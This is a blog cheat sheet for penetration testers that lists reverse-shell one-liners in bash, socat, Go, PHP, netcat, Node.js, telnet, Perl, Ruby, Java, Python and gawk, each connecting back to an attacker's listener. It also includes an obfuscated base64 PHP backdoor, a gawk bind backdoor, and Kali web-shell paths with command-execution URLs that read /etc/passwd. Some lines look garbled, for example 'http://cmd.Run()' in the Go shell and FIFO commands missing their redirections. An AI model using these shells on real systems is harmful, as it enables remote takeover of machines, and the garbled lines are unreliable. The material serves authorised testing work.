---
layout: blog_item
title:  "Reverse Shell Cheat Sheet"
date:   2020-11-05 05:37:10
author: Arr0way
description: 'Reverse Shell Cheat Sheet - 2020 update, a list of reverse shells for connecting back.'
categories: [cheat-sheet]
tags:
- 'Penetration Testing'
- 'Reverse Shell'
- shells
---

* list element with functor item
{:toc}

During penetration testing if you're lucky enough to find a remote command execution vulnerability, you'll more often than not want to connect back to your attacking machine to leverage an interactive shell.

Below are a collection of **reverse shells** that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.

If you found this resource usefull you should also check out our [penetration testing tools](/blog/penetration-testing-tools-cheat-sheet/) cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing. 

17/09/2020 - Updated to add the reverse shells submitted via Twitter @JaneScott 
29/03/2015 - Original post date

## Setup Listening Netcat

Your remote shell will need a listening netcat instance in order to connect back.  

<div class="note tip">
  <h5>Set your Netcat listening shell on an allowed port</h5>
  <p>Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443</p>
</div>

To setup a listening netcat instance, enter the following:

{% highlight bash %}
root@kali:~# nc -nvlp 80
nc: listening on :: 80 ...
nc: listening on 0.0.0.0 80 ...
{% endhighlight %}

<div class="note info">
  <h5>NAT requires a port forward</h5>
  <p>If you're attacking machine is behing a NAT router, you'll need to setup a port forward to the attacking machines IP / Port.</p>
</div>

**ATTACKING-IP** is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).

## Bash Reverse Shells
{% highlight bash %}
exec /bin/bash 0&0 2>&0
{% endhighlight %}

{% highlight bash %}
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
{% endhighlight %}

{% highlight bash %}
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

while read line 0<&5; do $line 2>&5 >&5; done
{% endhighlight %}

{% highlight bash %}
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
{% endhighlight %}

## socat Reverse Shell

Source: @filip_dragovic

{% highlight bash %}
socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
{% endhighlight %}

## Golang Reverse Shell

{% highlight go %}
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
{% endhighlight %}

## PHP Reverse Shell

A useful PHP reverse shell:

{% highlight bash %}
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
{% endhighlight %}

Another PHP reverse shell (that was submitted via Twitter):

{% highlight bash %}
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
{% endhighlight %}

Base64 encrypted by @0xInfection: 

```
<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
```

## Netcat Reverse Shell

<p>Useful netcat reverse shell examples:</p>

<p>Don't forget to start your listener, or you won't be catching any shells :) </p>

{% highlight bash %}
nc -lnvp 80
{% endhighlight %}

{% highlight bash %}
nc -e /bin/sh ATTACKING-IP 80
{% endhighlight %}

{% highlight bash %}
/bin/sh | nc ATTACKING-IP 80
{% endhighlight %}

{% highlight bash %}
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
{% endhighlight %}

A reverse shell submitted by [@0xatul](https://twitter.com/atul_hax) which works well for OpenBSD netcat rather than GNU nc: 

{% highlight bash %}
mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
{% endhighlight %}

## Node.js Reverse Shell

{% highlight bash %}
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
{% endhighlight %}

Source: @jobertabma via @JaneScott 

## Telnet Reverse Shell

{% highlight bash %}
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
{% endhighlight %}

{% highlight bash %}
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
{% endhighlight %}

Remember to listen on 443 on the attacking machine also.

## Perl Reverse Shell

{% highlight perl %}
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
{% endhighlight %}

### Perl Windows Reverse Shell

{% highlight perl %}
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
{% endhighlight %}

{% highlight perl %}
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
{% endhighlight %}

## Ruby Reverse Shell
{% highlight ruby %}
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
{% endhighlight %}

## Java Reverse Shell

{% highlight java %}
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
{% endhighlight %}

## Python Reverse Shell

{% highlight python %}
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}

## Gawk Reverse Shell

Gawk one liner rev shell by @dmfroberson: 

{% highlight gawk %}
gawk 'BEGIN {P=4444;S="> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
{% endhighlight %}

{% highlight gawk %}
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
{% endhighlight %}

## Kali Web Shells

The following shells exist within Kali Linux, under <code>/usr/share/webshells/</code> these are only useful if you are able to upload, inject or transfer the shell to the machine.

### Kali PHP Web Shells

Kali PHP reverse shells and command shells: 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>/usr/share/webshells/php/<br>php-reverse-shell.php</code></p>
      </td>
      <td>
            <p>Pen Test Monkey - PHP Reverse Shell</p>
      </td>
    </tr>

     <tr>
      <td>
        <p><code>/usr/share/webshells/<br>php/php-findsock-shell.php</code></p>
        <p><code>/usr/share/webshells/<br>php/findsock.c</code></p>
      </td>
      <td>
            <p>Pen Test Monkey, Findsock Shell. Build <code>gcc -o findsock findsock.c</code> (be mindfull of the target servers architecture), execute with netcat not a browser <code>nc -v target 80</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>/usr/share/webshells/<br>php/simple-backdoor.php</code></p>
      </td>
      <td>
            <p>PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: <code>http://target.com/simple-<br>backdoor.php?cmd=cat+/etc/passwd</code></p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>/usr/share/webshells/<br>php/php-backdoor.php</code></p>
      </td>
      <td>
            <p>Larger PHP shell, with a text input box for command execution.</p>
      </td>
    </tr>
      </tbody>
</table>
</div>

<div class="note tip">
  <h5>Tip: Executing Reverse Shells</h5>
  <p>The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.</p>
</div>


### Kali Perl Reverse Shell

Kali perl reverse shell:

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>/usr/share/webshells/perl/<br>perl-reverse-shell.pl</code></p>
      </td>
      <td>
            <p>Pen Test Monkey - Perl Reverse Shell</p>
      </td>
    </tr>

     <tr>
      <td>
        <p><code>/usr/share/webshells/<br>perl/perlcmd.cgi</code></p>
      </td>
      <td>
            <p>Pen Test Monkey, Perl Shell. Usage: <code>http://target.com/perlcmd.cgi?cat /etc/passwd</code></p>
      </td>
    </tr>
      </tbody>
</table>
</div>

### Kali Cold Fusion Shell

Kali Coldfusion Shell: 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>/usr/share/webshells/cfm/cfexec.cfm</code></p>
      </td>
      <td>
            <p>Cold Fusion Shell - aka CFM Shell</p>
      </td>
    </tr>
      </tbody>
</table>
</div>

### Kali ASP Shell

Classic ASP Reverse Shell + CMD shells:

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>/usr/share/webshells/asp/</code></p>
      </td>
      <td>
            <p>Kali ASP Shells</p>
      </td>
    </tr>
      </tbody>
</table>
</div>

### Kali ASPX Shells

ASP.NET reverse shells within Kali:

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>/usr/share/webshells/aspx/</code></p>
      </td>
      <td>
            <p>Kali ASPX Shells</p>
      </td>
    </tr>
      </tbody>
</table>
</div>

### Kali JSP Reverse Shell

Kali JSP Reverse Shell:

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>/usr/share/webshells/jsp/jsp-reverse.jsp</code></p>
      </td>
      <td>
            <p>Kali JSP Reverse Shell</p>
      </td>
    </tr>
      </tbody>
</table>
</div>
